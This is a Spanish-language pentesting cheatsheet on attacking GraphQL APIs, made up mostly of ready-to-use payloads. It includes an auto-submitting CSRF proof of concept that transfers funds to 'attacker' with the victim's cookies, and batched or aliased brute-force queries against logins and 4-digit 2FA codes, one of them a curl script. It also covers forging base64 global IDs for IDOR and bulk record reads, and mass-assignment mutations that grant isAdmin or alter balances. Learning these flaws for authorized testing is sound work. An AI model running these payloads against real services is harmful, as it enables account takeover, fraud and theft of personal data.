---
aliases:
  - GraphQL CSRF
  - Query Batching
  - GraphQL IDOR
  - GraphQL Mass Assignment
tags:
  - type/cheatsheet
  - vuln/graphql
  - vuln/auth-bypass
  - vuln/csrf
  - vuln/idor
  - technique/initial-access
  - technique/privilege-escalation
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[GraphQL Injection]]'
  - '[[Cross-Site Request Forgery (CSRF)]]'
  - '[[BOLA - IDOR]]'
---
# GraphQL - Auth y Lógica

***

## CSRF en GraphQL

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | GraphQL espera POST + JSON. Browser cross-site no manda JSON sin preflight CORS. CSRF requiere bypass de Content-Type. | Standard JSON CSRF. |
| Bypass via form text/plain | `<form enctype="text/plain" action="https://target/graphql"><input name='{"query":"mutation{deleteUser(id:1)}","_x":"' value='"}'></form>` | Body genera JSON parseable. |
| Bypass via GET method | `<img src="https://target/graphql?query=mutation{deleteUser(id:1)}">` | Si engine acepta GET para mutations (anti-pattern). |
| Bypass via x-www-form-urlencoded | `<form action="https://target/graphql"><input name="query" value="mutation{deleteUser(id:1)}"></form>` | Apollo / engines laxos. |
| Bypass via custom Content-Type tolerated | `application/x-www-form-urlencoded` con body JSON | Engine sniffs body. |
| Apollo Server v3+ default | Rejecta non-JSON en mutations | Más seguro. |
| Apollo Server v2 / lax | Aceptaba form-urlencoded | Histórico. |
| Hasura | Header `x-hasura-admin-secret` requerido para CSRF protection | Sin header, comportamiento varía. |
| GraphQL spec POST con form? | NO oficial — pero implementations laxas. | Bypass común. |
| CSRF token GraphQL | Apps modernas requieren token CSRF en header | Mitigación correcta. |
^graphql-auth-csrf

### CSRF PoC GraphQL (text/plain trick)

```html
<form action="https://target.com/graphql" method="POST" enctype="text/plain">
  <input name='{"query":"mutation{transferFunds(to:\"attacker\",amount:1000)}","_":"' value='"}'>
</form>
<script>document.forms[0].submit()</script>
```

Body literal: `{"query":"mutation{transferFunds(to:\"attacker\",amount:1000)}","_":"=" }`. Backend parsea JSON con tolerancia → mutation ejecutada con cookies victim.

___

## Query Batching para Bypass Rate Limit / Auth

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto batching | GraphQL spec permite mandar **array de queries** en un request | Engine ejecuta todas — single request, multiple ops. |
| Rate limit bypass | `[{"query":"mutation{login(u:\"a\",p:\"a\")}"}, {"query":"mutation{login(u:\"a\",p:\"b\")}"}, ...]` | Bruteforce 100 logins en 1 request — rate limit por request, no por op. |
| Auth check bypass | Algunas apps verifican auth en primer query del batch — siguientes pasan sin check | Anti-pattern. |
| Combine introspection + query | Batch de introspection + actual exploit | Cover en un solo request. |
| Aliases en lugar de batch | `{a:login(u:"a",p:"a") b:login(u:"a",p:"b") ...}` | Single query con N aliases — equivalente a batch. |
| Aliases bruteforce | `{a:login(u:"x",p:"1") b:login(u:"x",p:"2") c:login(u:"x",p:"3")}` | Bypass rate limit per query. |
| Aliases para 2FA | `{a:verify2FA(code:"0001") b:verify2FA(code:"0002") ...}` | Brute 4-dígitos en single request. |
| Disabled batching | Apollo v4 default rejecta batch | Patched. |
| Limit aliases | Apps modernas limitan N aliases | Defense. |
| Combine con timing | Batch + sleep gadget = oracle blind | Edge case. |
^graphql-auth-batching

### Batch bruteforce login

```bash
# 100 logins en 1 request
QUERY='[
  {"query":"mutation{login(username:\"admin\",password:\"password1\"){token}}"},
  {"query":"mutation{login(username:\"admin\",password:\"password2\"){token}}"},
  ...
  {"query":"mutation{login(username:\"admin\",password:\"password100\"){token}}"}
]'

curl -X POST -H "Content-Type: application/json" -d "$QUERY" https://target/graphql
```

Single request → rate limit cuenta 1 → todos los logins probados.

___

## IDOR via Global IDs

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | GraphQL Relay-style usa global IDs (`node(id:"VXNlcjox")`). IDs son base64 encoded `<Type>:<id>`. Predecibles. | Vector clásico. |
| Decode global ID | `echo "VXNlcjox" | base64 -d` → `User:1` | Reveals type + sequential ID. |
| Encode forge | `echo -n "User:42" | base64` → `VXNlcjo0Mg==` | Forge ID arbitrario. |
| Probe with node query | `{"query":"{node(id:\"VXNlcjo0Mg==\"){...on User{email phone}}}"}` | Lee user 42 sin auth de owner. |
| Numeric ID directo | `{"query":"{user(id:42){email}}"}` | Si app usa enteros simples. |
| UUID prediction | UUIDv1 contiene timestamp → predecible | Less secure than v4. |
| Sequential mutation | `{"query":"mutation{deleteUser(id:42)}"}` | Owner check missing. |
| Cross-tenant IDOR | Multi-tenant app con tenant_id no enforced | Wide vector. |
| Combine con introspection | Discover types con IDs → enumerar | Recon. |
| BOLA en arrays | `{"query":"{users(ids:[1,2,3,...,1000]){email}}"}` | Bulk IDOR. |
^graphql-auth-idor

___

## Mass Assignment via Mutations

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | Input type permite todos los fields del modelo — atacante asigna campos sensibles | Backend mapea input → DB sin filtro. |
| Probe con introspection | `__type(name:"UserInput"){inputFields{name}}` | Discover all input fields. |
| Force isAdmin true | `{"query":"mutation{updateUser(input:{name:\"x\",isAdmin:true}){id}}"}` | Inject privileged field. |
| Force role | `{"input":{"name":"x","role":"admin"}}` | Role string injection. |
| Force user_id | `{"input":{"username":"y","user_id":1}}` | Hijack ownership. |
| Force balance | `{"input":{"transferAmount":-1000000,"balance":99999999}}` | Financial. |
| Force email_verified | `{"input":{"email":"x","email_verified":true}}` | Bypass email verification. |
| Force created_at | Timestamp manipulation | Backdating. |
| Force createdBy | `{"input":{"...","createdBy":1}}` | Audit trail forge. |
| Force isPublic | `{"input":{"...","isPublic":true}}` | Visibility hijack. |
| Combine con IDOR | Mass assign + global ID forge → ATO complete | Standard chain. |
^graphql-auth-mass-assign

### Mass assignment workflow

```
1. Introspection del input type:
   { __type(name: "UserUpdateInput") { inputFields { name type { name } } } }

2. Identificar fields sensibles:
   - isAdmin, role, permissions
   - user_id, owner_id, tenant_id
   - email_verified, mfa_enabled
   - balance, credits, points
   - created_at, deleted_at

3. Forge mutation con field injection:
   mutation {
     updateUser(input: {
       name: "harmless",
       isAdmin: true,        # Inyectado
       role: "superadmin"    # Inyectado
     }) { id }
   }
```

***
